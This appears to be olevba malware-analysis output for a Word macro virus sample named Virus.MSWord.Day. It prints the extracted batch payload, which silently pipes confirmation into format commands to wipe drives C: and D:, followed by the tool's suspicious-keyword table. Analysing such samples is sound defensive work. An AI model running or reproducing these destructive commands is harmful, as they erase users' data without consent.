olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Day
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Day 
in file: Virus.MSWord.Day - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@echo off
break = off
echo Y | c:\windows\command\format c: /v:FUCK
echo Y | c:\windows\command\format d: /v:FUCK
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

